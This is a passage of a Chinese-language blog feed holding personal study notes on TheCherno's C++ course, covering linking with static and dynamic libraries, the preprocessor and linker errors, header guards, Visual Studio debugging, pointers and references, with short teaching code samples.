class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Singleton::<span class="built_in">Get</span>().<span class="built_in">Hello</span>();</span><br><span class="line">  Singleton::<span class="built_in">Get</span>().<span class="built_in">Hello</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>本人对程序编译链接过程理解不深，等以后再完善下面2节的内容。</p><h1 id="49-Using-Libraries-in-C-Static-Linking">49 Using Libraries in C++ (Static Linking)</h1><p>C++中没有包管理器。</p><p>对于大多数严肃的项目，Chern<strong>o推荐从源代码构建——编译器和链接器会进行优化，而非链接到预构建的二进制文件</strong>。能帮助调试，如果想修改库稍微改变一点就行。</p><p>选择32位还是64位，不取决于OS，而取决于目标应用程序。</p><p>库通常包含两部分，include和library，<strong>include是一堆头文件</strong>，<strong>lib目录里有那些预先构建的二进制文件——动态库和静态库</strong>（并不是所有库都提供2种）。静态链接在技术上更快，因为编译器和链接器实际上可执行链接时优化之类的——在链接时知道要链接的函数。而动态链接库被<strong>运行时的程序装载</strong>时，程序的部分将被补充完整。</p><p>glfw3dll.lib实际上包含了glfw3.dll中所有的函数、符号位置，所以可以在编译时链接它们。如果没有此文件，也能使用glfw3dll，但需要通过函数名来访问dll文件内的函数。<br>glfw3.lib 作为静态链接库比其他的大得多，如果不想编译时链接，就链接这个，这样在exe运行时就不需要glfw3.dll。</p><p>C++中对C函数进行声明：exteren “C” int g。</p><h1 id="50-Using-Dynamic-Libraries-in-C">50 Using Dynamic Libraries in C++</h1><p><strong>动态链接是在运行时进行链接，而静态链接是在编译时发生的。</strong><br>相比之下由于静态链接中编译器和链接器完全知道静态链接时实际进入应用程序的代码，其允许更多的优化发生。</p><p>GLFW同时支持静态和动态链接，二者使用相同的头文件。</p><p>glfw3dll.lib基本上就是一堆指向dll文件的指针，这样就不用在运行时去检索所有东西的位置，因此需要链接glfw3dll.lib。</p><p>glfw3.dll需要和exe文件放在一起才能被访问。</p><p><img src="/2023/04/07/C-Cherno-Cherno%E7%AC%94%E8%AE%B0-31-50/Untitled.png" alt></p><p>C++创建一个动态链接库，编译后会生成两个可用的文件一个是lib文件一个是dll文件，那么这个lib文件是干嘛的呢？<br>在使用动态库的时候，往往提供两个文件：一个引入库lib和一个DLL。<strong>引入库包含被DLL导出的函数和变量的符号名，DLL包含实际的函数和数据</strong>。在编译链接可执行文件时，只需要链接引入库，DLL中的函数代码和数据并不复制到可执行文件中，在运行的时候，再去加载DLL，访问DLL中导出的函数。<br>1． <strong>Load-time Dynamic Linking 载入时动态链接</strong><br>这种用法的前提是在编译之前已经明确知道要调用DLL中的哪几个函数，编译时在目标文件中只保留必要的链接信息，而不含DLL函数的代码；当程序执行时，利用链接信息加载DLL函数代码并在内存中将其链接入调用程序的执行空间中，其主要目的是便于代码共享。<br>2． <strong>Run-time Dynamic Linking 运行时动态链接</strong><br>这种方式是指在编译之前并不知道将会调用哪些DLL函数，完全是在运行过程中根据需要决定应调用哪个函数，并<strong>用LoadLibrary和GetProcAddress动态获得DLL函数的入口地址</strong>。</p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> Cherno </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Cherno笔记(1-30)</title>
      <link href="/2023/04/01/C-Cherno-Cherno%E7%AC%94%E8%AE%B0-1-30/"/>
      <url>/2023/04/01/C-Cherno-Cherno%E7%AC%94%E8%AE%B0-1-30/</url>
      
        <content type="html"><![CDATA[<blockquote><p>💡 “Best C++ course for game development。”<br>同样适合作为C++初学者的入门课，讲到都是C++在工作中最重要的内容。</p></blockquote><p>课程地址：<a href="https://www.youtube.com/watch?v=18c3MTX0PK0&amp;list=PLlrATfBNZ98dudnM48yfGUldqGD0S4FFb&amp;index=1">Youtube上TheCherno上传的视频</a><br>翻译：<a href="https://www.bilibili.com/video/BV1uy4y167h2/?spm_id_from=333.788&amp;vd_source=0d3fa48307c38b76dfdfa60ed4b44b42">神经元猫的高质量翻译</a></p><h1 id="1-Welcome-to-C">1 Welcome to C++</h1><p>如果用C++写垃圾代码，甚至有可能比虚拟机语言（C#, Java）更慢，因为后者会再运行时优化很多东西而C++不会。</p><h1 id="2-How-to-Setup-C-on-Windows">2 How to Setup C++ on Windows</h1><p>不要使用VS默认位置：地址长且包含一个空格，英伟达的某些VS安卓插件的某些部分无法正常工作。</p><p><strong>solution基本就是一个工作台，是一个包含多个相关project的集合</strong>，这些project可以是不同类型的，比如dll、exe、lib等，而每个project是文件的集合，然后被编译成某种目标二进制文件（比如library或executable）。</p><h1 id="3-How-to-Setup-C-on-Mac">3 How to Setup C++ on Mac</h1><p>后面的教程都是基于Visual Studio的，由于没钱买Mac，这里就跳过了。</p><h1 id="4-How-to-Setup-C-on-Linux">4 How to Setup C++ on Linux</h1><p>这节教Linux上<a href="https://www.codeblocks.org/">Code::Blocks</a>的使用，本人在Linux上习惯用vscode，这节没认真看。</p><h1 id="5-How-C-Works">5 How C++ Works</h1><p>任何以#开头的都是<code>预处理指令（processor statement</code> ，会将对应文件进行拷贝和粘贴，它们发生在真正的编译过程之前。</p><p>如果你不返回任何值，它会返回0，这只适用于main()。</p><p><code>&lt;&lt;</code> ：被重载的符号，虽然看起来像运算符，可以把它们想象成一个函数。<br><code>std::cout &lt;&lt; “Hello World!” &lt;&lt; std::endl;</code> 可以想成伪代码 <code>std::cout.print(”Hello World!”).print(std::endl);</code> （后者跑不起来）。</p><p>防止关闭窗口：<code>std::cin.get()</code> 或 <code>system(”pause”);</code> 。</p><p>VS中Output Window和Error List都可以看到错误，但是Error List几乎是垃圾，它本身就是尝试在Output中寻找Error单词并把信息加入Error List，它提供的是overview，如果想要更详细的信息，还是得去Output Windows中看。<br>双击Output中的行数，会自动将光标定位到对应位置。</p><ul><li>声明（declarations）：说该符号或者函数存在</li><li>定义（definitions）：说明这个函数到底是啥</li></ul><p>若声明却没有定义函数，编译器依旧完全相信你，但链接器试图寻找定义的函数时却找不到该函数就会报链接错误。如果都正确了，编译器会将每个文件但单独编译为 .obj 文件，而链接器会将他们合并为一个可执行文件，例如 exe 文件。</p><h1 id="6-How-the-C-Compiler-Works">6 How the C++ Compiler Works</h1><p>cpp文件可称为 <code>translation unit</code>，c++和Java不同：Java文件必须与class对应，而文件夹必须与package对应；而<strong>C++中文件只是向编译器喂源码的方式，一个cpp文件对应一个obj文件。</strong></p><p>#include 预处理指令只是会将对应文件的全部内容原原本本的复制粘贴到源码中，形成.i后缀文件（VS中需要在项目属性中打开预处理到文件，注意VS提示我们这将不会生成obj文件）。</p><p>可以使用如下语句控制.i文件内容：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> 条件</span></span><br><span class="line">语句块<span class="number">1</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">语句块<span class="number">2</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p><strong>constant folding</strong>：编译优化时完成常数运算，而非运行时，比如 return 2 * 5 对应 mov eax 10。</p><p>Debug模式默认开启Od，即不优化，便于分析.asm汇编文件。</p><h1 id="7-How-the-C-Linker-Works">7 How the C++ Linker Works</h1><p>VS按 <code>ctrl+F7</code> 或点编译，则只会进行编译<br>VS按 <code>ctrl+F5</code> 或点生成（build），则会对整个项目进行compile+link，需要entry point（可以是main()也可以是其他——在VS项目属性中定义）</p><p>error C2143：以C开头为编译错误，LNK2143：以LNK开头为链接时错误</p><h2 id="Unresolved-external-symbol">Unresolved external symbol</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ---Log.cpp---</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Logr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *message)</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; message &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ---Math.cpp---</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Log</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Multiply</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">Log</span>(<span class="string">&quot;Multiply&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> a * b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; <span class="built_in">Multiply</span>(<span class="number">5</span>, <span class="number">8</span>) &lt;&lt; std::endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>由于linker找不到Log()，build会报 LNK1120：1 unresolved external symbol。</li><li>若注释14行  <code>Log(&quot;Multiply&quot;);</code> 则不会报错，因为linker不需要去寻找Log()地址。</li><li>若注释19行 <code>std::cout &lt;&lt; Multiply(5, 8) &lt;&lt; std::endl;</code> 则仍然会报错，因为<strong>虽然本文件没用到Multiply()，但是其他文件生成时可能会link到Multiply()。</strong></li><li>若注释20行，同时在Multiply()前加上<strong>static声明</strong>（不能被其他obj文件函数引用），则不会报错。</li></ol><h2 id="重复定义">重复定义</h2><ol><li>一个文件中定义两个名称、参数、返回类型完全相同的函数会报 C2084。</li><li>两个文件中定义两个名称、参数、返回类型完全相同的函数会报 LNK1169。下面例子展示这种错误有多容易犯：</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ---Log.h---</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Log</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *message)</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; message &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ---Log.cpp---</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Log.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitLog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">Log</span>(<span class="string">&quot;Initialized Log&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ---Math.cpp---</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Log.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Log</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Multiply</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">Log</span>(<span class="string">&quot;Multiply&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> a * b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; <span class="built_in">Multiply</span>(<span class="number">5</span>, <span class="number">8</span>) &lt;&lt; std::endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题： Log.cpp和Math.cpp中都有 Log() 的定义，这导致linker无法选择。</p><p>3钟解决方式如下：</p><ol><li>推荐：<strong>.h头文件保留声明，定义放到第三个translation unit中</strong>，这里放到Log.cpp中很合适。</li><li>在.h中Log()前加上static：2个cpp中的Log都不能被其他obj文件链接</li><li>在.h中Log()前加上inline：作用是将函数调用直接替换成函数体<br><code>Log(&quot;Initialized Log&quot;);</code> 变成 <code>std::cout &lt;&lt; &quot;Initialized Log&quot; &lt;&lt; std::endl;</code></li></ol><h1 id="8-Variables-in-C">8 Variables in C++</h1><p>c++中不同变量类型之间的唯一区别是大小——创建变量时通过数据类型决定分配的内存大小。数据类型取决于程序员，并没有很多规则去束缚，但是cout等时会根据类型决定打印的结果。<br>( Cherno这样说其实有点问题，不只是内存大小不同的问题，类型还将决定可执行的操作。)</p><p><code>float val = 5.5;</code> 可能会以为浮点数常量的是float类型，但在VS把光标放到<code>5.5</code>上可以看到其实是(double)(5.5)，稍后被强制转化为float。<br>要定义浮点数要使用 <code>float val = 5.5f;</code> 或 <code>float val = 5.5F;</code> 。</p><p>bool类型变量只有0是false，非0都是true，打印bool变量会得到0或1。<br>虽然存储bool类型按理来说1bit就可以，但没办法寻址1个bit的内容，内存寻址的最小单元是byte。可通过技巧解决：一个byte放8个bool。</p><h1 id="9-Functions">9 Functions</h1><ul><li>函数：降低重复代码的代码块。</li><li>方法：class中的代码块。</li></ul><p>声明应当放在头文件中，定义放在cpp文件中。</p><h1 id="10-Header-files">10 Header files</h1><p>有两种不同文件类型的概念，一种是像cpp一样编译文件，这种就有头文件概念；而另一种像C#和Java中没有头文件概念。</p><p>VS中文件夹是假的，文件具体放在哪个文件夹其实都可以。</p><p><code>#pragma once</code>: #开头的都是预处理指令，发生在编译之前。<br>组织单个头文件被多次包含，并转换为单个翻译单元——可以被放在程序的多个位置，但一个翻译单元（一个cpp文件）只能放一次。</p><p><code>#pragma once</code> <strong>很简洁很好用，工业中广泛应用</strong>。<br>另一种传统方式是添加 <code>header guides</code> 如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _LOG_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _LOG_H</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitLog</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Log</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Player</span> &#123;&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>如果被包含两次，则结果如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _LOG_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _LOG_H</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitLog</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Log</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Player</span> &#123;&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _LOG_H  <span class="comment">// false, endif前的都不会被执行</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _LOG_H</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitLog</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Log</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Player</span> &#123;&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>&lt;&gt;与“”：</p><ul><li>尖括号：告诉<strong>编译器目标路径</strong>中包含所需要包含的文件夹。</li><li>引号： 既包含相对于当前路径的文件，比如<code>#include “../Log.h”</code> ，又可用来指定编译器包含目录的相对路径里的文件，比如<code>#include “iostream”</code> 。</li><li>尖括号只用于编译器包含路径，引号可以做一切（通常用在包含相对路径）。</li></ul><p>iostream其实也是文件，只不过没有扩展名，c++设计者有意通过这点将C++标准库与C标准库区分。</p><h1 id="11-How-to-DUBUG-in-VS">11 How to DUBUG in VS</h1><p>调试的两大部分：断点 和 读取内存。</p><p>VS的调试模式中会给所有未初始化的局部变量赋值为<code>0xcc</code>， 在调试/窗口/内存中可以打开内存视图，输入<code>&amp;a</code>，可以查看变量地址和值。</p><p>str初始化后，可以通过其值（是一个字符串地址）去寻找到对应字符串，如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00609B30</span>  <span class="number">68</span> <span class="number">65</span> <span class="number">6</span>c <span class="number">6</span>c <span class="number">6f</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">48</span> <span class="number">65</span> <span class="number">6</span>c <span class="number">6</span>c <span class="number">6f</span> <span class="number">20</span> <span class="number">57</span> <span class="number">6f</span> <span class="number">72</span> <span class="number">6</span>c <span class="number">64</span> <span class="number">21</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> b0 <span class="number">40</span> <span class="number">08</span> <span class="number">9</span>c  hello...Hello World!......?@.?</span><br><span class="line"><span class="number">0x00609B4E</span>  <span class="number">60</span> <span class="number">00</span> <span class="number">18</span> <span class="number">9</span>d <span class="number">60</span> <span class="number">00</span> <span class="number">70</span> <span class="number">9</span>e <span class="number">60</span> <span class="number">00</span> <span class="number">94</span> <span class="number">9</span>e <span class="number">60</span> <span class="number">00</span> d4 <span class="number">9</span>e <span class="number">60</span> <span class="number">00</span> <span class="number">08</span> <span class="number">9f</span> <span class="number">60</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  `..?`.p?`.??`.??`..?`.........</span><br><span class="line"><span class="number">0x00609B6C</span>  <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">53</span> <span class="number">74</span> <span class="number">61</span> <span class="number">63</span> <span class="number">6b</span> <span class="number">20</span> <span class="number">61</span> <span class="number">72</span> <span class="number">6f</span> <span class="number">75</span> <span class="number">6</span>e <span class="number">64</span> <span class="number">20</span> <span class="number">74</span>  ................Stack around t</span><br><span class="line"><span class="number">0x00609B8A</span>  <span class="number">68</span> <span class="number">65</span> <span class="number">20</span> <span class="number">76</span> <span class="number">61</span> <span class="number">72</span> <span class="number">69</span> <span class="number">61</span> <span class="number">62</span> <span class="number">6</span>c <span class="number">65</span> <span class="number">20</span> <span class="number">27</span> <span class="number">00</span> <span class="number">27</span> <span class="number">20</span> <span class="number">77</span> <span class="number">61</span> <span class="number">73</span> <span class="number">20</span> <span class="number">63</span> <span class="number">6f</span> <span class="number">72</span> <span class="number">72</span> <span class="number">75</span> <span class="number">70</span> <span class="number">74</span> <span class="number">65</span> <span class="number">64</span> <span class="number">2</span>e  he variable <span class="string">&#x27;.&#x27;</span> was corrupted.</span><br><span class="line"><span class="number">0x00609BA8</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">54</span> <span class="number">68</span> <span class="number">65</span> <span class="number">20</span> <span class="number">76</span> <span class="number">61</span> <span class="number">72</span> <span class="number">69</span> <span class="number">61</span> <span class="number">62</span> <span class="number">6</span>c <span class="number">65</span> <span class="number">20</span> <span class="number">27</span> <span class="number">00</span> <span class="number">00</span> <span class="number">27</span> <span class="number">20</span> <span class="number">69</span> <span class="number">73</span> <span class="number">20</span> <span class="number">62</span> <span class="number">65</span> <span class="number">69</span> <span class="number">6</span>e <span class="number">67</span>  ....The variable <span class="string">&#x27;..&#x27;</span> is being</span><br><span class="line"><span class="number">0x00609BC6</span>  <span class="number">20</span> <span class="number">75</span> <span class="number">73</span> <span class="number">65</span> <span class="number">64</span> <span class="number">20</span> <span class="number">77</span> <span class="number">69</span> <span class="number">74</span> <span class="number">68</span> <span class="number">6f</span> <span class="number">75</span> <span class="number">74</span> <span class="number">20</span> <span class="number">62</span> <span class="number">65</span> <span class="number">69</span> <span class="number">6</span>e <span class="number">67</span> <span class="number">20</span> <span class="number">69</span> <span class="number">6</span>e <span class="number">69</span> <span class="number">74</span> <span class="number">69</span> <span class="number">61</span> <span class="number">6</span>c <span class="number">69</span> <span class="number">7</span>a <span class="number">65</span>   used without being initialize</span><br><span class="line"><span class="number">0x00609BE4</span>  <span class="number">64</span> <span class="number">2</span>e <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  d.............................</span><br><span class="line"><span class="number">0x00609C02</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">54</span> <span class="number">68</span> <span class="number">65</span> <span class="number">20</span> <span class="number">76</span> <span class="number">61</span> <span class="number">6</span>c <span class="number">75</span> <span class="number">65</span> <span class="number">20</span> <span class="number">6f</span> <span class="number">66</span> <span class="number">20</span> <span class="number">45</span> <span class="number">53</span> <span class="number">50</span> <span class="number">20</span> <span class="number">77</span> <span class="number">61</span> <span class="number">73</span> <span class="number">20</span> <span class="number">6</span>e <span class="number">6f</span> <span class="number">74</span>  ......The value of ESP was <span class="keyword">not</span></span><br></pre></td></tr></table></figure><h1 id="12-CONDITIONS-and-BRANCHES-in-C">12 CONDITIONS and BRANCHES in C++</h1><p>可以通过避免分支对程序进行优化。</p><p>可以在VS编辑区右键进入反汇编代码，静态分析反汇编代码在没有源码时非常有用，但在有源码时这是nightmare的，不过分析汇编代码可以学习一些知识：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> compare_res = x == <span class="number">5</span>;</span><br><span class="line"><span class="number">00</span>AB195C  cmp         dword ptr [x],<span class="number">5</span>  </span><br><span class="line"><span class="number">00</span>AB1960  jne         __$EncStackInitStart+<span class="number">32</span>h (<span class="number">0</span>AB196Eh)  </span><br><span class="line"><span class="number">00</span>AB1962  mov         dword ptr [ebp<span class="number">-0</span>DCh],<span class="number">1</span>  </span><br><span class="line"><span class="number">00</span>AB196C  jmp         __$EncStackInitStart+<span class="number">3</span>Ch (<span class="number">0</span>AB1978h)  </span><br><span class="line"><span class="number">00</span>AB196E  mov         dword ptr [ebp<span class="number">-0</span>DCh],<span class="number">0</span>  </span><br><span class="line"><span class="number">00</span>AB1978  movzx       eax,byte ptr [ebp<span class="number">-0</span>DCh]  </span><br><span class="line"><span class="number">00</span>AB197F  mov         byte ptr [compare_res],al</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> compare_res = <span class="number">423</span>;</span><br><span class="line"><span class="number">00F</span>B195C  mov         byte ptr [compare_res],<span class="number">1</span></span><br></pre></td></tr></table></figure><p><strong>不要写单行写 <code>if (x == 5)  cout &lt;&lt; “y” &lt;&lt; endl;</code> ：调试时不能进入后一句</strong>且<strong>不便于增添！</strong></p><p><code>else if</code> 并非什么C++关键词，其实就是 <code>else + if (条件)</code> 。</p><h1 id="13-BEST-Visual-Studio-Setup-for-C-Projects">13 BEST Visual Studio Setup for C++ Projects!</h1><p>VS中展示的并不是文件夹（folder），而是过滤器（filter）。在项目下新建的也是filter。<br>点击“显示所有文件的图标”后展示的就是磁盘目录视图，在这里可以新建folder。推荐新建一个<code>src</code>文件夹，然后将所有cpp文件和头文件都放到里面。</p><p>输出目录：<code>$(SolutionDir)bin\$(Platform)\$(Configuration)\</code></p><p>中间件目录：<code>$(SolutionDir)bin\intermediates\$(Platform)\$(Configuration)\</code></p><h1 id="14-Loops-in-C-for-loops-while-loops">14 Loops in C++ (for loops, while loops)</h1><p>个人觉得循环没啥好讲的</p><h1 id="15-Control-Flow-in-C-continue-break-return">15 Control Flow in C++ (continue, break, return)</h1><ul><li>continue：只在loop中出现。</li><li>break：多在loop中出现，也在switch中出现。</li><li>return：完全退出function，在哪都可以。</li></ul><h1 id="16-POINTERS-in-C">16 POINTERS in C++</h1><p>目前只讨论raw pointers，不讨论smart pointers。</p><p>指针对manage和manipulate内存极度重要，pointer is a integer which stores a memory address。类型实际上没有意义，只是帮助推断地址所指的数据类型。</p><p><code>void* ptr = 0;</code>  表述此无类型（类型实际上无意义）指针为NULL，内存地址不能到0。<br>实际上0表示NULL，或者说NULL和nullptr被define为0。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">6</span>;</span><br><span class="line"><span class="type">double</span>* ptr = (<span class="type">double</span>*)&amp;x;</span><br><span class="line">*ptr = <span class="number">10</span>;</span><br><span class="line">std::cout &lt;&lt; x &lt;&lt; std::endl;  <span class="comment">// 最终输出0</span></span><br></pre></td></tr></table></figure><p>编译器会根据类型设置位模式，也会根据类型解释位模式。</p><p><img src="/2023/04/01/C-Cherno-Cherno%E7%AC%94%E8%AE%B0-1-30/Untitled.png" alt="Untitled"></p><p>逆向引用：指针的*运算符通常被称为dereference运算符</p><p>指针也是存在于内存中的<strong>变量</strong>，可以使用double pointer。</p><p>指针指向堆上内存的例子：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span>* buffer = <span class="keyword">new</span> <span class="type">char</span>[<span class="number">8</span>];</span><br><span class="line"><span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span>[] buffer;</span><br></pre></td></tr></table></figure><p>注意手动删除指针数组需要使用<code>delete []</code>。</p><h1 id="17-REFERENCES-in-C">17 REFERENCES in C++</h1><p>引用只是指针的扩展，是指针的语法糖，使它更容易容易阅读、更容易理解。<br><strong>没有什么引用能做而指针不能做的事情</strong>，指针更有用更强大，但是很多情况下使用引用更简单。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 